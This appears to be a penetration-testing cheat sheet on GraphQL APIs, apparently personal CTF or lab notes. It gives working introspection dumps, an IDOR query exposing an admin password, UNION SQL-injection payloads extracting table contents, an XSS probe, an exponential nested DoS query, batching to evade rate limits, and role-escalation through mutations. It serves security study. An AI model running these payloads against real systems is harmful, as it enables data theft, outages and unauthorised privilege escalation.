---
layout: default
title: GraphQL
permalink: /Web/graphql/
---

# Basics

A GraphQL service typically runs on a single endpoint, most commonly at `/graphql`, `/api/graphql`, or something similar.

For details: [https://graphql.org/learn/](https://graphql.org/learn/)

# graphw00f
Frist clone the [repository](https://github.com/dolevf/graphw00f), then run the `main.py` script.
```
python3 main.py -d -f -t http://$ip
```
- `-f`: fingerprint mode
- `-d`: detect mode

Accessing the GraphQl endpoint in a browser can reveal additional information.

## Introspection
Introspection is a GraphQL feature to query about the structure of the backend system.
All GraphQL types supported by the backend:
```
{
  __schema {
    types {
      name
    }
  }
}
```
After we know a type, we can obtain the name of all of the type's fields with the following introspection query:
```
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```
We can also obtain all the queries supported by the backend:
```
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```
Query that dumps all information about types, fields, and queries supported by the backend:
```
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

We can visualize the schema using tools such as [GraphQL-Voyager](https://github.com/APIs-guru/graphql-voyager).

# Insecure Direct Object Reference (IDOR)

A good start is to enumerate requests with Burp.

A query like that in a POST request could reveal a password:
```
{"query":"{user(username: \"admin\") { username password }}"}
```

# Injection Attacks

## SQL Injection
We should investigate all GraphQL queries, check whether they support arguments, and analyze these arguments for potential SQL injections.
We can send the query without any arguments and if the backend expects an argument, the response contains an error that tells us the name of the required argument.
When a GraphQL query returns a structured object (like UserObject), UNION-based SQL injection can be used by aligning your payload with the structure of the object.
Example:
- Target GraphQL Field: user
- Returned Object Type: UserObject (6 fields: uuid, id, username, password, role, msg - results of the introspection query)
- Injection Vector: username parameter

1. Discover Table Names
```
{
  user(username: "' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```
- Match number of columns in UNION SELECT to fields in the return object.
- Use GROUP_CONCAT() to aggregate results when only one row is returned.
- Payload is injected inside a string argument to a GraphQL object query.
- Terminate original query with ' and comment remainder with -- -.

2. Discover Column Names in flag Table
```
{
  user(username: "' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -") {
    username
  }
}
```
3. Extract Flag from flag Table
```
{
  user(username: "' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -") {
    username
  }
}
```

## Cross-Site Scripting (XSS)
XSS vulnerabilities can occur if GraphQL responses are inserted into the HTML page without proper sanitization.
Potential testing payload:
```
<script>alert(1)</script>
```

# Denial-of-Service (DoS) & Batching Attacks
Depending on the GraphQL API's configuration, we can create queries that result in exponentially large responses and require significant resources to process. 
Example:
If we identify a loop between two objects let's say the 'author' and the 'posts' fields, we can abuse this loop by constructing a query that queries the author of all posts. For each author, we then query the author of all posts again. If we repeat this many times, the result grows exponentially larger, potentially resulting in a DoS scenario.
Since the posts object is a connection, we need to specify the edges and node fields to obtain a reference to the corresponding Post object. As an example, let us query the author of all posts. From there, we will query all posts by each author and then the author's username for each of these posts:
```
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```
Making the query large:
```
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              posts {
                edges {
                  node {
                    author {
                      posts {
                        edges {
                          node {
                            author {
                              posts {
                                edges {
                                  node {
                                    author {
                                      posts {
                                        edges {
                                          node {
                                            author {
                                              posts {
                                                edges {
                                                  node {
                                                    author {
                                                      posts {
                                                        edges {
                                                          node {
                                                            author {
                                                              posts {
                                                                edges {
                                                                  node {
                                                                    author {
                                                                      username
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```
## Batching Attacks

Batching in GraphQL refers to executing multiple queries with a single request.

Example:
Query the ID of the user admin and the title of the first post in a single request:
```
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Length: 86
Content-Type: application/json

[
	{
		"query":"{user(username: \"admin\") {uuid}}"
	},
	{
		"query":"{post(id: 1) {title}}"
	}
]
```
It can potentially be used to conduct brute-force attacks with significantly fewer HTTP requests. This could lead to bypasses of security measures in place to prevent brute-force attacks, such as rate limits.

# Mutations
Introspection query to identify all mutations supported by the backend and their arguments:
```
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```
Let's say we can identify the 'registerUser' mutation in the result and the mutation requires a RegisterUserInput object as an input.
Query all fields of the RegisterUserInput object:
```
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```
Following this example, from the result we can identify that we can provide the new user's username, password, role, and msg. As we identified earlier, we need to provide the password as an MD5-hash (`echo -n 'password' | md5sum`).
Register a new user:
```
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

## Exploitation with Mutations
To identify potential attack vectors through mutations, we need to thoroughly examine all supported mutations and their inputs. In the previous example, we can provide the role argument for newly registered users, which might enable us to create users with a different role than the default role, potentially allowing us to escalate privileges.

# Tools
## [graphw00f](https://github.com/dolevf/graphw00f)
## [graphql-voyager](https://github.com/APIs-guru/graphql-voyager)
## [GraphQL-Cop](https://github.com/dolevf/graphql-cop)
After cloning and installing the dependencies:
```
python3 graphql-cop.py  -v
```
```
python3 graphql-cop/graphql-cop.py -t http://$ip/graphql
```
## [InQL](https://github.com/doyensec/inql)
Burp extension we can install via the BApp Store in Burp.
- adds GraphQL tabs in the Proxy History and Burp Repeater that enable simple modification of the GraphQL query without having to deal with the encompassing JSON syntax
- we can right-click on a GraphQL request and select Extensions > InQL - GraphQL Scanner > Generate queries with InQL Scanner - InQL generates introspection information. The information regarding all mutations and queries is provided in the InQL tab for the scanned host

